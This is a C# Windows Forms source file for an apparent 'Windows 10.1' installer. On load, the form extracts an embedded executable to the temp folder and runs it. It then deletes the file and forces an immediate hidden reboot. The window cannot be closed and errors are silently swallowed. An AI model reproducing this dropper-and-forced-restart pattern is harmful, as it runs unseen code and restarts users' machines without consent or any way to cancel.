using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows10._1Installer
{
    public partial class Form3 : Form
    {
        public Form3()
        {
            InitializeComponent();
        }
        protected override CreateParams CreateParams
        {
            get
            {
                const int CS_NOCLOSE = 0x200;

                CreateParams cp = base.CreateParams;
                cp.ClassStyle |= CS_NOCLOSE;
                return cp;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void Form3_Load(object sender, EventArgs e)
        {
            Thread thr = new Thread(Changes);
            thr.Start();
        }
        private void Changes()
        {
            try
            {
                var temp = Path.GetTempPath();
                File.WriteAllBytes(temp + @"\tmpinstall5672.exe",Properties.Resources.install);
                Process.Start(temp + @"\tmpinstall5672.exe").WaitForExit();
                this.Hide();
                File.Delete(temp + @"\tmpinstall5672.exe");;
                Thread.Sleep(5000);
                ProcessStartInfo info = new ProcessStartInfo();
                info.FileName = @"C:\Windows\System32\shutdown.exe";
                info.Arguments = "-r -t 00 -f";
                info.CreateNoWindow = true;
                info.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(info);
                Environment.Exit(0);
            }
            catch
            {

            }
        }

        private void Form3_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
    }
}
